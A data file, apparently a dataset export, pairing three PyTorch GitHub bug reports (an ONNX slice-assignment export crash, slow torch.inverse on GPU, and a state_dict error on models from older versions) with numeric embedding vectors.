 -1.77447230e-01  4.64431643e-01 -2.62790620e-02 -1.62240285e-02
  1.95859164e-01 -2.15805680e-01  7.30108321e-02  9.54171550e-03
 -1.21743165e-01  3.28405291e-01  2.41611749e-01 -3.45188379e-03
  4.21019852e-01 -9.26036760e-02  4.74207923e-02 -1.73081636e-01
 -3.71603847e-01 -1.98332712e-01  2.82389641e-01  8.72967541e-02
 -2.63817728e-01  1.32285221e-03 -1.54301941e-01 -6.96460754e-02
  5.97357750e-04 -1.89950123e-01  1.43742248e-01 -2.43500769e-01
 -1.74907781e-02 -1.60044879e-01 -2.36387663e-02  2.46677518e-01
  3.31052840e-01 -3.02049797e-02  4.31434929e-01 -6.20711111e-02
 -8.23229179e-03  3.77224416e-01  1.30414084e-01  3.57089013e-01
 -2.96728313e-01 -1.73417762e-01 -1.51269495e-01 -3.25860202e-01
 -2.07715690e-01 -8.69814515e-01 -3.44128251e-01  1.28701538e-01
 -2.10473567e-01 -1.49135977e-01  3.19448113e-01  3.17659765e-01
  3.82914871e-01 -1.36152640e-01 -5.88712394e-02  4.80350107e-02
  6.49154112e-02 -1.28419828e-02  1.70477256e-02  9.42547768e-02
 -1.06865190e-01  4.35611978e-02  3.00885849e-02  2.17186809e-01
  4.05743644e-02  7.09300786e-02  8.75290856e-03  2.85842896e-01
  4.73039784e-02  1.32621557e-01 -3.07866424e-01  2.68181413e-01
  8.25565457e-02  3.69705260e-01  5.12930676e-02 -2.46947557e-02
 -1.54835105e-01  8.36253464e-02  3.36742550e-01 -2.90061831e-01
 -4.83942591e-02 -2.46805891e-01 -1.64818913e-02 -3.08513850e-01
 -3.86657298e-01 -1.26707613e-01 -1.08668454e-01 -4.50173050e-01
  5.18188402e-02  2.36934155e-01  3.02878655e-02  3.24200779e-01
 -1.06219143e-01  1.14283890e-01 -1.83787763e-01 -6.33959658e-03
 -2.01657191e-01  1.20369434e+00  6.23328462e-02  3.83058190e-01
  3.46345276e-01 -2.28937287e-02  2.37183720e-01 -2.21711129e-01
 -2.99384203e-02  4.53435004e-01  2.49228209e-01 -7.16799721e-02
 -3.63733113e-01  1.11777872e-01 -5.09958208e-01 -4.95014966e-01
 -1.89967871e-01 -9.27716214e-03 -4.14310902e-01  3.32264453e-01
  3.01594913e-01 -2.52431333e-01 -1.37858838e-01  2.41473168e-01
  5.22887334e-02 -4.06121105e-01 -1.60446316e-01  4.64340717e-01
  4.37810123e-02  3.65377009e-01 -4.76886295e-02 -5.61759900e-03
  7.44247288e-02  3.09659243e-01  4.48370725e-02 -4.60824072e-01
 -6.67634755e-02  1.49659202e-01 -3.44058096e-01  1.36418030e-01
  3.52418244e-01 -1.60131156e-01  2.32510626e-01  2.10374951e-01
  1.25588179e-02  9.41355675e-02  1.73894629e-01 -2.58860476e-02
  9.37842950e-02  4.46868330e-01 -2.35341135e-02 -1.33819014e-01
  5.18276840e-02  1.32263243e-01  1.19898960e-01 -3.08148921e-01
 -5.50564826e-02 -1.09269254e-01 -9.84744877e-02  1.17213786e-01
 -4.37585227e-02 -1.53878763e-01 -3.32668722e-01  5.34993887e-01
  1.22554637e-01  2.82032818e-01  4.57431376e-01  1.56943113e-01
  8.68162289e-02 -6.06060475e-02 -2.47888595e-01 -3.20235014e-01
  3.73867691e-01  1.11516424e-01  3.88766429e-03 -8.26953799e-02
 -1.07893974e-01  7.05849975e-02 -4.47509170e-01 -4.58555184e-02
  5.88899314e-01  7.88964629e-02  1.16249219e-01  2.77840495e-01
 -1.21142857e-01  4.44308892e-02  1.70468986e-01  4.51285124e-01
 -5.85188270e-02 -8.28284919e-02  1.82770312e-01 -1.91900700e-01
  2.51196951e-01 -2.50274725e-02 -4.86771405e-01 -3.39153588e-01
 -4.86553043e-01  1.36558130e-01  2.78480291e-01 -2.30144113e-01
 -5.49189001e-02 -3.67055461e-02  1.93036459e-02  2.17156321e-01
 -4.08091322e-02  1.10149398e-01  2.21787378e-01 -2.01062903e-01
 -5.06450571e-02  6.07197545e-02 -8.91657919e-02  2.09421650e-01
  1.16148919e-01 -1.68980248e-02 -4.00234461e-01  3.64615023e-01
 -7.98249617e-02 -2.46637061e-01  7.44189844e-02 -5.44890523e-01
  2.50129640e-01  1.07952114e-02  3.40033889e-01  1.36916619e-02
  6.09185636e-01 -4.97835577e-01 -1.24426723e-01  7.83787742e-02
 -1.12625882e-01 -4.56470735e-02  6.68345839e-02  2.96984881e-01
  5.60475945e-01 -6.75610751e-02 -4.87578101e-04 -2.19485238e-01
 -6.15866482e-01 -1.44398317e-01 -2.78855026e-01 -4.08743322e-02
  4.76390839e-01  1.98223531e-01  1.61849722e-01  2.83622772e-01
 -1.01201251e-01 -1.40823312e-02  1.07001074e-01 -2.13552453e-02
 -3.61922413e-01  2.53860086e-01 -3.19526717e-02 -2.67871857e-01
  1.16477758e-02  3.05608381e-02 -8.30539167e-02 -2.13587090e-01
  6.61849141e-01 -7.18839765e-01  4.74143177e-02  4.53636944e-01
 -1.33384287e-01  4.43218797e-01 -2.09196676e-02 -1.50809297e-02
 -1.98447868e-01  5.18366992e-01 -8.38332772e-02  1.80104777e-01
  7.17384443e-02 -1.49572194e-01 -3.11791211e-01 -1.34799793e-01
  2.59708285e-01  2.53970921e-01 -8.53972912e-01 -3.27466652e-02
 -1.83950104e-02 -9.04444829e-02 -6.21072799e-02  1.50779963e-01
  5.02982773e-02  1.62445009e-01 -1.59056243e-02 -1.73886940e-02
 -5.06448448e-01 -1.61403030e-01  1.57192856e-01 -2.72298098e-01
 -5.57803735e-02  9.70947519e-02  1.53385505e-01 -3.91653240e-01
 -5.54130645e-03 -7.16031343e-02  2.74926007e-01  5.56948066e-01
 -1.93939675e-02  6.71190908e-03  1.67526267e-02  2.11749114e-02
 -3.62435818e-01  2.38078147e-01 -1.25220433e-01  4.16664004e-01
 -1.21344648e-01  1.46253347e-01  1.58527523e-01  3.09501618e-01
 -3.27816486e-01  9.00549516e-02 -4.04897720e-01  5.22122532e-03
  1.02695949e-01 -3.91860396e-01 -3.13091874e-01 -2.10116923e-01
 -1.75942630e-01  3.33658129e-01 -5.79234600e-01  1.18125424e-01
 -2.80702442e-01 -9.34068114e-04  1.29966930e-01 -1.15171656e-01
  1.94548815e-01 -2.38078069e-02  1.37327105e-01 -7.79900998e-02
 -3.08898417e-03 -4.84278891e-03 -3.34146917e-02 -3.09962574e-02]"
bug in conversion torch model to onnx model  module: onnx triaged,"## ðŸ› Bug
I'm converting a pytorch model to onnx model. in this model there assignment of tensor to a slice of another tensor.
when i'm running the converted model with onnxruntime he crashes when trying to assign the small tensor to the big tensor and ignoring the slice operation.


## To Reproduce
i created a stand alone model to reproduce the problem. this is the error when trying to run the model:

**The input tensor cannot be reshaped to the requested shape. Input shape:{22,256}, requested shape:{56,1,256}**

Steps to reproduce the behavior:
run the attached code

<!-- If you have a code sample, error messages, stack traces, please provide it here as well -->

``import torch
import onnx
import onnxruntime

class Test(torch.nn.Module):
    def __init__(self):
        super().__init__()

    def forward(self, x: torch.Tensor, y: torch.Tensor) -> torch.Tensor:
        x[:y.size(0), 0, :] = y
        return x

x = torch.zeros((56,6,256))
y = torch.rand((22,256))

m = Test()
torch_outputs = m(x, y)

path = ""/tmp/m.onnx""
torch.onnx.export(m, (x, y), path,
                    do_constant_folding=True,
                    opset_version=12,
                    input_names=[""x"", ""y""],
                    output_names=[""z""])

onnx_model = onnx.load_model(path)
onnx.checker.check_model(onnx_model)
inferred_model = onnx.shape_inference.infer_shapes(onnx_model)
onnx.save(inferred_model, path)

ort_model = onnxruntime.InferenceSession(path)

ort_outputs = ort_model.run([""z""], {""x"": x.numpy(), ""y"": y.numpy()})``

## Expected behavior
run successfully the model with onnxruntime

## Environment


 - PyTorch Version: 1.5.1 
 - OS (e.g., Linux): Linux ubuntu 16.04
 - How you installed PyTorch (`conda`, `pip`, source): pip
 - Build command you used (if compiling from source):
 - Python version: 3.6.8
 - GPU models and configuration:
 - Any other relevant information: onnxruntime verion 1.4.0


cc @houseroad @spandantiwari @lara-hdr @BowenBao @neginraoof",True,"[-2.47503176e-01 -2.23031878e-01 -2.18355596e-01 -1.32562086e-01
 -2.20676720e-01 -1.81954846e-01 -3.32213007e-02  3.32232565e-02
 -1.90565184e-01 -6.00775629e-02  1.24202721e-01 -8.47075600e-03
 -2.32271582e-01  1.92508340e-01 -1.01284012e-01  4.96494994e-02
 -5.91117084e-01 -2.05044955e-01 -3.67579669e-01  1.06149815e-01
  8.52540135e-02 -1.75932020e-01 -2.19989359e-01  1.85298398e-02
 -1.38741076e-01  1.23372123e-01  2.03989446e-04 -2.26310879e-01
  4.05920029e-01  3.34511958e-02 -1.29198343e-01  1.11854732e-01
 -4.30552006e-01 -4.18931097e-02  3.75698507e-02  2.00009584e-01
 -4.85679328e-01  9.29274559e-02 -2.42090642e-01  1.16919093e-01
  4.70763385e-01  2.12079495e-01  1.86631948e-01 -1.51973711e-02
 -4.14933041e-02 -2.08589099e-02  1.54141318e-02 -9.55071226e-02
 -2.51308978e-01  7.68037587e-02 -1.82234287e-01  9.48160291e-02
 -2.50734806e-01  2.62950547e-03  2.01243050e-02 -2.48093426e-01
 -3.69480550e-02 -1.99556760e-02  6.73109591e-02 -4.18029726e-01
  7.57848322e-02  1.86203182e-01 -1.54712155e-01 -1.70639783e-01
  1.64166585e-01 -1.18939281e-01  1.57259867e-01 -6.62152618e-02
  4.39036965e-01  9.28356275e-02  1.65021360e-01 -6.23822585e-02
 -3.08615193e-02 -1.50742620e-01  7.54740834e-02 -1.26888603e-01
 -2.71585703e-01  4.59322214e-01  1.42655820e-01 -4.28082086e-02
  8.91501456e-02 -2.84141637e-02  4.95944358e-03 -1.62765861e-01
  1.04388364e-01  7.98132084e-03  1.64230704e-01 -2.70790130e-01
  5.51333606e-01  9.15427431e-02  3.50689411e-01  7.44138807e-02
  7.91913047e-02  2.32035011e-01  1.46120116e-01  3.97814691e-01
  5.88288084e-02  1.84656650e-01  6.79035634e-02 -2.39346474e-01
 -1.91130966e-01 -2.92353928e-01 -2.75791660e-02  4.88984644e-01
  2.68421412e-01 -4.05973867e-02  9.78010893e-02 -8.09571669e-02
  9.03264135e-02 -1.51758909e-01  2.16680706e-01  3.37500796e-02
  3.11090708e-01  1.12485409e-01 -3.32214087e-02 -3.67163867e-01
  1.69210389e-01  1.52810570e-02 -3.34336817e-01  2.87173271e-01
  1.71742477e-02 -6.22741655e-02  9.77328271e-02  1.96733207e-01
  3.41322161e-02  2.74720371e-01 -4.16047990e-01  3.22795622e-02
 -1.98389083e-01  2.43505865e-01  4.76034969e-01 -1.70902219e-02
 -1.25345021e-01 -1.77532643e-01  3.19950402e-01  1.14499852e-01
 -1.83496907e-01  8.85757431e-03 -2.91632831e-01 -1.04700379e-01
 -9.24253464e-02 -1.18750885e-01 -2.49683246e-01 -2.18938515e-01
  2.46056557e-01 -3.26822996e-02 -2.80698657e-01  1.72806785e-01
  2.91392833e-01  3.41483653e-01 -7.40206093e-02 -2.53300250e-01
 -3.38629693e-01  3.93529654e-01  1.34667113e-01  8.76280963e-02
 -1.19558480e-02  1.18549064e-01 -6.67581409e-02 -5.20584464e-01
 -6.27346784e-02  1.63797110e-01  3.58870402e-02 -2.65837491e-01
  2.72277057e-01  2.52121210e-01 -1.11319080e-01 -2.26858035e-02
 -3.04476529e-01  1.19697779e-01  1.66125685e-01 -2.98207458e-02
 -1.99871391e-01  3.53704430e-02  3.78287107e-01 -4.37633321e-02
  1.90861076e-01 -6.61539137e-01  1.43691804e-02  3.84132653e-01
  5.33494353e-01  2.28744715e-01  5.25538921e-01 -1.96551178e-02
  6.09209798e-02  1.16770521e-01  3.71709049e-01 -6.31219298e-02
 -3.04616094e-01 -5.85488304e-02 -2.13756502e-01 -1.15564570e-01
  3.17818850e-01  6.24062456e-02 -1.23226374e-01 -8.32255408e-02
  1.82581730e-02 -3.58410358e-01  1.22231953e-02 -8.81374702e-02
 -1.86001379e-02 -1.13396317e-01  3.14369202e-02 -1.68404877e-01
  3.69389635e-03 -1.67410076e-01 -3.35983485e-01 -5.17733216e-01
 -4.93559778e-01  3.11742693e-01 -2.36729205e-01 -5.01656532e-01
 -3.14408727e-03 -1.70273930e-01 -2.01060489e-01 -5.03011048e-02
  1.36839211e-01 -1.25862315e-01 -2.51007438e-01  1.37402847e-01
  2.34133080e-01  3.27707112e-01 -1.42547011e-01 -7.59434104e-02
 -2.72761822e-01  5.60283922e-02 -2.90700138e-01 -2.72531390e-01
 -2.08979063e-02 -2.41270568e-02  1.96045376e-02 -2.04055667e-01
  1.20754838e-01  3.63327749e-02  2.62863159e-01  2.58219719e-01
 -3.18532139e-01 -2.04116255e-02 -2.54976511e-01  6.32656552e-03
 -1.99687988e-01 -9.94410813e-02 -1.81070715e-01 -2.18150109e-01
 -1.41955972e-01  7.81945884e-02 -8.52217302e-02  2.08500981e-01
 -2.42910922e-01  3.30118150e-01  1.72471240e-01  8.02903026e-02
  7.55261332e-02  3.71364616e-02  2.95088887e-01 -1.27137661e-01
  3.57598782e-01  1.09183893e-01  1.41013891e-01  2.65250534e-01
  2.69815207e-01  1.98364645e-01  5.81960380e-02  4.16763008e-01
  2.19767913e-01  1.96533743e-03 -1.70287192e-01  3.10681701e-01
 -1.91476345e-02  6.38075471e-02  2.41021335e-01 -1.89872235e-01
  2.89805442e-01 -1.56857967e-01  2.10939031e-02 -3.92906964e-01
  2.49822259e-01  1.11842036e-01 -3.66524339e-01 -3.22960436e-01
  3.11711490e-01  2.30399698e-01 -1.48350939e-01  2.14885175e-01
  1.27315611e-01 -3.51727545e-01 -6.03609346e-02 -2.13561535e-01
 -1.40720904e-01 -2.04334572e-01 -2.69521385e-01 -5.96753210e-02
  5.64309001e-01 -9.84542519e-02 -4.41776246e-01  3.73734176e-01
  3.49908650e-01  1.48899928e-01 -3.39856520e-02  7.35595375e-02
  9.49836969e-02 -1.22551829e-01  2.94478118e-01 -3.17663670e-01
 -1.09748803e-01 -1.26781806e-01  4.65278745e-01  1.32123247e-01
  3.70583117e-01 -1.98648766e-01  2.96272516e-01 -2.71508023e-02
 -2.15785295e-01  2.49216199e-01 -1.55226178e-02 -2.33751088e-02
 -3.62106711e-02  5.81654429e-01  3.43140334e-01  2.72803083e-02
 -1.16679862e-01 -7.53006199e-03  3.57468426e-03 -5.95434569e-02
 -2.90629491e-02 -2.19359854e-03 -2.99439281e-01 -2.80826479e-01
 -2.82026082e-01  1.26630336e-01 -2.56881148e-01 -9.57072228e-02
  2.93820381e-01  5.06439090e-01 -6.67856261e-02 -4.14347529e-01
 -9.74945128e-02  4.88019735e-01 -2.71479301e-02 -4.90455985e-01
 -8.96679163e-02 -2.98348367e-01  2.82054394e-02 -3.45850408e-01
 -1.99712157e-01 -3.61765087e-01  1.58771023e-01  2.22298771e-01
  6.50956929e-02  2.07871050e-02 -1.61739230e-01  6.04444295e-02
  4.98280637e-02  3.79963577e-01 -2.55625397e-01  3.44614118e-01
  9.19375271e-02  1.95666984e-01  1.77332044e-01  3.99423897e-01
 -1.70843035e-01  2.70452529e-01 -3.09860766e-01 -1.52298912e-01
  8.45371783e-02 -3.46596614e-02  5.77851757e-03 -2.58556843e-01
  2.11966023e-01  5.33841670e-01 -2.41182864e-01  3.65040481e-01
 -8.39950740e-02  6.97004497e-02  4.57478404e-01 -2.94834673e-01
 -1.95266619e-01  3.04686248e-01  2.80453470e-02 -2.62397200e-01
  1.18557870e-01  1.53214589e-01 -3.95873666e-01 -2.56121188e-01]"
torch.inverse() performing very poorly on GPU vs CPU module: performance module: cuda triaged module: linear algebra,"## ðŸ› Bug
We observed a big increase in inference latency after adding `torch.inverse()` in the code path. After investigation and comparison with moving the op to CPU we found that there is a huge difference in performance of that op on GPU vs CPU.
The matrix size in our case is 4x4 which small for the GPU but `torch.inverse()` should be using `magma` library which has heuristics to move the op to CPU. We didn't see any magma invocations as well.

Based on @ptrblck suggestion we tried `inverse` on batched matrix to see if that made any difference but that also didn't result in any improvement.

**Performance Difference:**
```
â•°â”€ python torch_inverse_exp.py
GPU Time: 8.78560 ms
CPU Time: 0.07149 ms
cpu/gpu: 122.90x
```
We increased the matrix dimensions to 1024x1024 but even then GPU is slower than CPU:
```
â•°â”€ python torch_inverse_exp.py
GPU Time: 17.25289 ms
CPU Time: 9.54982 ms
cpu/gpu: 1.81x
```
## To Reproduce
Here is the snippet of code which can be run to reproduce the performance difference:
```
import torch
import time

a = torch.randn(4,4).cuda()
torch.cuda.synchronize()

num_iter = 100
def test1():
    s = time.time()
    for i in range(num_iter):
        x = torch.inverse(a)
    torch.cuda.synchronize()
    e = time.time()
    gpu_time = ((e - s)/num_iter)
    return  gpu_time

def test2():
    s = time.time()
    for i in range(num_iter):
        b = a.to('cpu')
        d = torch.inverse(b)
        y = d.to('cuda')
    torch.cuda.synchronize()
    e = time.time()
    cpu_time = ((e - s)/num_iter)
    return  cpu_time

gpu_time = test1()
print(""GPU Time: {:.5f} ms"".format(gpu_time*1000))

cpu_time = test2()
print(""CPU Time: {:.5f} ms"".format( cpu_time*1000))

print(""cpu/gpu: {:.2f}x "".format(gpu_time/cpu_time))
```
**Run:** `python <script_name>`

## Environment

Please copy and paste the output from our
[environment collection script](https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py)
(or fill out the checklist below manually).

You can get the script and run it with:
```
wget https://raw.githubusercontent.com/pytorch/pytorch/master/torch/utils/collect_env.py
# For security purposes, please check the contents of collect_env.py before running it.
python collect_env.py

Collecting environment information...
PyTorch version: 1.5.1 (pip package)
Is debug build: No
CUDA used to build PyTorch: 10.1 & 10.2 (NGC 20.03 container)

OS: Ubuntu 18.04.4 LTS
GCC version: (Ubuntu 8.4.0-1ubuntu1~18.04) 8.4.0
CMake version: version 3.17.3

Python version: 3.7
Is CUDA available: Yes
CUDA runtime version: 10.1.243
GPU models and configuration:
GPU 0: TITAN RTX
GPU 1: TITAN RTX

Nvidia driver version: 440.100
cuDNN version: /usr/lib/x86_64-linux-gnu/libcudnn.so.7.6.5

Versions of relevant libraries:
[pip3] numpy==1.18.5
[pip3] numpydoc==1.1.0
[pip3] torch==1.5.1
[pip3] torchvision==0.6.0a0+35d732a
[pip3] torchviz==0.0.1
[conda] _pytorch_select           0.2                       gpu_0
[conda] blas                      1.0                         mkl
[conda] cudatoolkit               10.1.243             h6bb024c_0
[conda] mkl                       2020.1                      217
[conda] mkl-service               2.3.0            py37he904b0f_0
[conda] mkl_fft                   1.1.0            py37h23d657b_0
[conda] mkl_random                1.1.1            py37h0573a6f_0
[conda] numpy                     1.18.5           py37ha1c710e_0
[conda] numpy-base                1.18.5           py37hde5b4d6_0
[conda] numpydoc                  1.1.0                      py_0
[conda] pytorch                   1.5.1           py3.7_cuda10.1.243_cudnn7.6.3_0    pytorch
[conda] torchvision               0.6.1                py37_cu101    pytorch
[conda] torchviz                  0.0.1                    pypi_0    pypi
```

@ptrblck @ngimel for visibility

cc @ngimel @vincentqb @vishwakftw @SsnL @jianyuh @VitalyFedyunin",True,"[-0.25846133 -0.16495462 -0.19802421  0.08221866 -0.28965938 -0.4984338
 -0.3032698   0.4330899  -0.1209687  -0.11167625 -0.05670659  0.3196598
 -0.25667363  0.1114027  -0.0795666   0.09652732  0.19103801 -0.04430718
 -0.08815093 -0.21787216  0.02905881 -0.35147226 -0.21596964 -0.12870154
  0.22071916  0.2389281   0.01381406 -0.09480491  0.3311788  -0.04743074
  0.04296978 -0.1436531   0.18342867 -0.22793038 -0.2576754  -0.13190097
 -0.19799523 -0.14043003 -0.15189418  0.04246553 -0.1931329   0.3758274
  0.01531722  0.28542548 -0.1265715  -0.27022952 -0.10581109  0.05269959
 -0.10378917 -0.1852516   0.02744675  0.26494145 -0.1161281  -0.13691382
 -0.11734155  0.01543428 -0.08086437  0.03391225  0.12499139 -0.19529118
  0.41640037  0.0745867  -0.07444781 -0.00598251  0.28829122 -0.02126973
  0.06983604 -0.07731535  0.15085314  0.19857416 -0.13478059 -0.3432106
 -0.01506358 -0.31841534  0.01660934  0.0868033  -0.28052518  0.04951811
 -0.01688891 -0.2367893   0.60730225  0.04508834 -0.32355362  0.05022838
  0.36165226  0.06798421  0.2522449  -0.02432876  0.2716855  -0.19961795
  0.22432381 -0.04563285 -0.2083857   0.43362632  0.05461771  0.00626262
  0.08749001 -0.22112949  0.08107956 -0.11264301  0.01743599 -0.2416311
 -0.42655316  0.5123898  -0.2284503  -0.21354347 -0.03105907  0.44860542
  0.06855253  0.07820796  0.3958575   0.08606992 -0.01842     0.2003991
  0.00885391 -0.12453059  0.00128635  0.14500776 -0.13176098  0.13054194
 -0.11950865  0.05753278  0.04873372  0.15014133  0.5392386  -0.2736556
 -0.15244907 -0.02415945 -0.02616437  0.26040065  0.15596426 -0.21477765
  0.03373882 -0.1881516   0.32167947  0.15369341 -0.2263102   0.18286479
 -0.17754899  0.2986758  -0.02581229  0.1978907  -0.23745485 -0.11441873
  0.29065496  0.2025072  -0.35423636 -0.08739623  0.274345    0.08447526
 -0.23607159 -0.19850852 -0.26321167  0.17179449 -0.01126595 -0.00929991
  0.03978039  0.13071707  0.08170515 -0.40789843 -0.0913977   0.11446244
  0.19061959 -0.07809155  0.33241278  0.11028092 -0.05723658  0.03835399
 -0.6107126   0.39571503  0.03648793 -0.32593367 -0.0864557   0.01439169
  0.4204036  -0.11870839 -0.10756712 -0.10356025 -0.13642189  0.14793779
  0.52443504  0.3260094   0.4230171   0.22907269 -0.01443802  0.09032992
  0.6302527   0.31099215 -0.44146976 -0.06867667 -0.6055254  -0.42581254
 -0.49679524  0.03964767 -0.12098745 -0.15215436  0.05758129  0.2621612
 -0.08983081  0.22635888 -0.24126998 -0.06476066  0.06849834 -0.14492917
  0.05832281  0.10061999 -0.4596905  -0.41552293 -0.6559701   0.05035723
 -0.06159455 -0.13010071 -0.05311199 -0.015439   -0.16795391  0.04053356
 -0.16821513  0.31829596 -0.15350825  0.12063289  0.3883364   0.09037401
  0.26777184 -0.16812539 -0.07694105 -0.17413354 -0.14988558  0.00092931
 -0.12664717  0.03094449  0.1477715  -0.19846323  0.24405262 -0.10150479
 -0.12728177  0.45432547  0.05420072  0.02865078 -0.01451928  0.00829574
 -0.1550262  -0.14285026  0.13816077 -0.00877517  0.30470657  0.42218462
 -0.30082548  0.03276221  0.34159863  0.06443445 -0.17663933 -0.15065543
 -0.18273771 -0.02806604 -0.05674905  0.1790885   0.00845997 -0.09094118
 -0.1435934   0.1494519  -0.10858545  0.17977619 -0.17337966  0.43335146
  0.14287627  0.13140823  0.01749037  0.09824359 -0.15350312  0.06255635
  0.04867424 -0.22990236  0.4612164  -0.28663468  0.51115835 -0.07866807
  0.36200666  0.1699341  -0.08495907 -0.2741104   0.29471052  0.1760917
 -0.42250165  0.31483182  0.30544806 -0.44558108 -0.02569395 -0.12487081
 -0.24245138 -0.22165167 -0.1865734  -0.405672    0.25994393 -0.10179785
 -0.03935419  0.06559183  0.2271462   0.29545426  0.1554482  -0.12023242
 -0.11703412  0.16710176  0.02122276  0.14009258 -0.42401648 -0.00771222
  0.26014745 -0.01843054  0.35170522 -0.04241887  0.14347522 -0.01778437
 -0.09349474 -0.07488838 -0.19547687  0.34290993  0.1255205  -0.07538306
 -0.01038436  0.11758147  0.09070051 -0.12741321 -0.03914035  0.10973656
 -0.15106882 -0.06957547 -0.25715357  0.01155934 -0.12606052 -0.12148201
  0.35398307  0.15365231  0.29261824  0.13299635 -0.0514899  -0.03568258
  0.14942405  0.2638992   0.00438549 -0.13548978 -0.45493847  0.05327999
 -0.2259108  -0.27218032  0.00070909 -0.03418215  0.45317957  0.3246091
 -0.14513606  0.04460927 -0.22154061  0.07071583  0.03164747  0.03409211
  0.07762923  0.27077118  0.47231734  0.26299602 -0.13228194  0.02546673
 -0.04808674 -0.13855857 -0.4254009  -0.07574323 -0.03474762 -0.10970713
  0.08014641 -0.162827    0.12539516  0.00590001  0.11578503  0.13227877
 -0.30403632  0.02493812  0.5366326  -0.5695434  -0.15833186 -0.3166439
 -0.03134585  0.03936908  0.22400136  0.08191116 -0.003731   -0.19482811]"
Accessing state_dict() of models trained with previous pytorch version high priority triage review module: nn triaged,"## ðŸ› Bug

Since updating to version 1.6, when trying to access `model.state_dict()` of a older pytorch trained models (where model is a subclass of torch.nn.module), I'm getting a `ModuleAttributeError`.

## To Reproduce

Steps to reproduce the behavior:

```
torch.load(""path/to/model"", map_location='cpu')
print(model.state_dict())
```
where the model was trained with an older version of pytorch.

The output is
```
  File ""/home/oliviermt/miniconda3/envs/projections/lib/python3.7/site-packages/torch/nn/modules/module.py"", line 900, in state_dict
    module.state_dict(destination, prefix + name + '.', keep_vars=keep_vars)
  File ""/home/oliviermt/miniconda3/envs/projections/lib/python3.7/site-packages/torch/nn/modules/module.py"", line 900, in state_dict
    module.state_dict(destination, prefix + name + '.', keep_vars=keep_vars)
  File ""/home/oliviermt/miniconda3/envs/projections/lib/python3.7/site-packages/torch/nn/modules/module.py"", line 897, in state_dict
    self._save_to_state_dict(destination, prefix, keep_vars)
  File ""/home/oliviermt/miniconda3/envs/projections/lib/python3.7/site-packages/torch/nn/modules/module.py"", line 860, in _save_to_state_dict
    if buf is not None and name not in self._non_persistent_buffers_set:
  File ""/home/oliviermt/miniconda3/envs/projections/lib/python3.7/site-packages/torch/nn/modules/module.py"", line 772, in __getattr__
    type(self).__name__, name))
torch.nn.modules.module.ModuleAttributeError: 'GaussianSmearing' object has no attribute '_non_persistent_buffers_set'
```

I was able to make it work by adding the following lines after the the `torch.load`:
```
for mod in model.modules():
     if not hasattr(mod, ""_non_persistent_buffers_set""):
            mod._non_persistent_buffers_set = set()
```
If it's expected behaviour, then ignore this issue, but I would guess it's not.
Thanks a lot!

## Expected behavior

Not needing to add those 3 lines.

## Environment

PyTorch version: 1.6.0
Is debug build: No
CUDA used to build PyTorch: 10.2

OS: Ubuntu 16.04.6 LTS
GCC version: (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
CMake version: version 3.5.1

Python version: 3.7
Is CUDA available: No
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA

Versions of relevant libraries:
[pip3] numpy==1.19.1
[pip3] torch==1.6.0
[pip3] torchvision==0.7.0
[conda] numpy                     1.19.1                   pypi_0    pypi
[conda] torch                     1.6.0                    pypi_0    pypi
[conda] torchvision               0.7.0                    pypi_0    pypi

## Additional context

<!-- Add any other context about the problem here. -->


cc @ezyang @gchanan @zou3519 @albanD @mruberry",True,"[-0.32556286 -0.17412123 -0.16282888 -0.08828019 -0.03301068 -0.13373241
 -0.16742608 -0.18302393 -0.37088752  0.12511101  0.054018   -0.02681745
 -0.1530023   0.33000737  0.10604821  0.03964184 -0.05015127 -0.16637298
  0.02195521 -0.15248969  0.32293582 -0.01112566  0.01430464 -0.02609001
 -0.21942571  0.01901355 -0.1136049  -0.2687434   0.2755853   0.00095587
 -0.10481866 -0.01094168 -0.42203686 -0.00394584 -0.02277232  0.08878271
 -0.26877895 -0.24665862 -0.06989681  0.0418178   0.20029187  0.175038
 -0.12362467 -0.04534352 -0.23273826 -0.10704118 -0.20532694  0.1642864
 -0.35590577 -0.3057336  -0.07861531  0.23939312 -0.10243201 -0.07106633
  0.09207752 -0.05927109  0.10765608 -0.00076166 -0.08622683 -0.34172827
 -0.10742693  0.04655649 -0.309932   -0.06736463  0.02310148  0.1421619
 -0.10715259  0.0584192   0.58656657 -0.2718949  -0.09595902 -0.00480216
 -0.09979233 -0.07035135 -0.04872957 -0.0144737  -0.28805298  0.23017521
  0.01385915 -0.3162526   0.22225007 -0.08068943 -0.00912366  0.08054967
  0.18184717 -0.03649192  0.10614195 -0.03285091  0.29991376  0.28175086
  0.13244504 -0.19826901 -0.00995107  0.4549331  -0.06757415  0.31174892
 -0.05977054  0.0370457  -0.00583179 -0.28262448 -0.2538756  -0.58159953
 -0.04989213  0.3744159   0.02525709 -0.19518457  0.15062179  0.35456192
  0.31508756 -0.17788395  0.02386535  0.13265595 -0.08957553 -0.03927736
  0.17277673 -0.15039283 -0.15171394  0.03144738 -0.07074726  0.16452077
  0.28934222 -0.1015406   0.17337433  0.14235526  0.29434916  0.2317034
 -0.05534783 -0.0455518   0.0572874   0.10685311  0.1793711   0.23707017
 -0.05240215 -0.02047583  0.44494683  0.05826621 -0.23717597 -0.25337708
  0.02725141  0.14164948 -0.28211832 -0.14482892 -0.06382672 -0.28067124
  0.03066902  0.22566515 -0.30104834  0.18296292  0.1149663   0.1888302
 -0.01485931 -0.19166888 -0.25488892  0.37524918  0.0334324   0.12666036
  0.04723276  0.09161616  0.3985227  -0.31088507 -0.0842961   0.27718514
  0.08395942 -0.08077747  0.28174233 -0.03082753 -0.04167049 -0.22157815
 -0.18666634  0.02596066  0.02234604 -0.20040138 -0.02690502 -0.6195295
  0.06267059 -0.02201469 -0.27918187 -0.22686678  0.03859743  0.3889019
  0.1216151   0.17178452 -0.05486976  0.17316356  0.11183763  0.08405059
  0.42305264 -0.11183742 -0.11767703  0.19105121 -0.28508747 -0.1781432
  0.31508523 -0.13589188 -0.08261787 -0.1810087   0.1602697   0.27321172
 -0.06019899 -0.11647715 -0.06838551  0.16547947  0.0142028  -0.07075597
  0.0659342  -0.07880178 -0.39483073 -0.39682925 -0.18594608  0.07065885
 -0.34571034 -0.1316338   0.12381139 -0.0716456  -0.10659832 -0.06894483
  0.00135566  0.05043071  0.1324271   0.24461827  0.05807204  0.11180268
  0.08418043 -0.18060738  0.1857934   0.26548994  0.05860617 -0.02303943
  0.08893001 -0.19593126 -0.06171926 -0.17893761  0.31646347  0.08016197
  0.17520872  0.13985613  0.15288363  0.06756366  0.12435366  0.1936426
